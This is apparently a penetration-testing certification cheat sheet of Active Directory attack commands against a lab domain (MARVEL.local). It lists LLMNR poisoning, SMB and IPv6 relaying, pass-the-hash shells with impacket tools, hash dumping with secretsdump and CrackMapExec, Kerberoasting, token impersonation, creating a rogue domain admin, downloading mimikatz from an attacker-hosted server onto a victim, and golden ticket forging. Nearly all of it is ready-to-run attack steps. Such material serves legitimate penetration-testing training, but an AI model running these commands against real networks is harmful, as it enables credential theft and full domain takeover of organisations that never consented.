## PJPT Active Directory Cheat Sheet
✅ Passed PJPT on First Attempt

## Hashcat Commands
- `hashcat --help | grep NTLM`
- `hashcat -m 5600 hash1.txt /usr/share/wordlists/rockyou.txt`
- `hashcat -m 5600 hash1.txt /usr/share/wordlists/rockyou.txt --show`
- `hashcat -m 5600 hash1.txt /usr/share/wordlists/rockyou.txt --force`
- `hashcat -m 5600 hash1.txt /usr/share/wordlists/rockyou.txt -O`

## LLMNR Poisoning
- `sudo responder -I eth0 -dPv`

## SMB Relay Attack
- `nmap --script=smb2-security-mode.nse -p445 <IP Address>`
- `sudo mousepad /etc/responder/Responder.conf`  *(disable SMB/HTTP)*
- `sudo responder -I eth0 -dPv`
- `impacket-ntlmrelayx -tf targets.txt -smb2support`
- `impacket-ntlmrelayx -tf targets.txt -smb2support -i`
- `nc 127.0.0.1 11000`

## Gaining Shell (PSEXEC)
- `impacket-psexec marvel.local/fcastle:'Password1'@<IP Address>`
- `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:6c598d4edc98d0a0c9797ef98b869751 administrator@<IP Address>`

## Gaining Shell (WMI/SMB)
- `impacket-wmiexec administrator@<IP Address> -hashes aad3b435...:7facdc498ed168...`
- `impacket-smbexec administrator@<IP Address> -hashes aad3b435...:7facdc498ed168...`

## IPv6 Attack
- `sudo mitm6 -d marvel.local`
- `impacket-ntlmrelayx -6 -t ldaps://<IP Address> -wh fakewpad.marvel.local -l lootme`

## ldapdomaindump
- `sudo ldapdomaindump ldaps://<IP Address> -u 'MARVEL\fcastle' -p Password1`

## BloodHound
- `sudo neo4j console`
- `sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns <IP Address> -c all`

## CrackMapExec Post-Exploitation
- `crackmapexec smb <IP Address> -u fcastle -d MARVEL.local -p Password1`
- `crackmapexec smb <IP Address> -u administrator -H aad3b435b... --local-auth`
- `crackmapexec smb <IP Address> --local-auth --sam`
- `crackmapexec smb <IP Address> --local-auth --shares`
- `crackmapexec smb <IP Address> --local-auth --lsa`
- `crackmapexec smb <IP Address> -L`
- `crackmapexec smb <IP Address> -M lsassy`

## SecretsDump
- `impacket-secretsdump MARVEL.local/fcastle:Password1@<IP Address>`

## Dump Hashes from Machines
- `impacket-secretsdump MARVEL.local/fcastle:'Password1'@<IP Address>`
- `impacket-secretsdump Administrator@<IP Address> -hashes aad3b435...:7facdc498ed168...`

## Crack with Hashcat
- `hashcat -m 5600 hash1.txt /usr/share/wordlists/rockyou.txt`

## Kerberoasting
- `sudo impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip <IP Address> -request`
- `hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt`

## Token Impersonation (Meterpreter)
- `getuid`
- `load incognito`
- `list_tokens -u`
- `impersonate_token marvel\fcastle`
- `shell`
- `whoami`
- `rev2self`

## Add Domain Admin via Net Commands
- `net user /add hawkeye Password1@ /domain`
- `net group "Domain Admins" hawkeye /ADD /DOMAIN`

## Watering Hole Attack
- `netexec smb -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<IP Address>`
- `sudo responder -I eth0 -dPv`

## Mimikatz Transfer + Execution
- `python3 -m http.server 8080`
- `Invoke-WebRequest -Uri "http://<IP Address>:8080/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"`
- `privilege::debug`
- `sekurlsa::logonPasswords`

## Dump NTDS.dit
- `impacket-secretsdump MARVEL.local/pparker:'Password2'@<IP Address> -just-dc-ntlm`

## Crack with Hashcat Again
- `hashcat -m 5600 hash1.txt /usr/share/wordlists/rockyou.txt`
- `hashcat -m 5600 hash1.txt /usr/share/wordlists/rockyou.txt --show`

## Golden Ticket Attack with Mimikatz
- `privilege::debug`
- `lsadump::lsa /inject /name:krbtgt`
- `kerberos::golden /User:Administrator /domain:AFC-RICHMOND.LOCAL /sid:S-1-5-21-839... /krbtgt:a9dde840... /id:500 /ptt`
- `misc::cmd`

## Additional (Check Only – Do NOT Exploit)
- Zerologon (Vulnerability Check)
- PrintNightmare (Vulnerability Check)
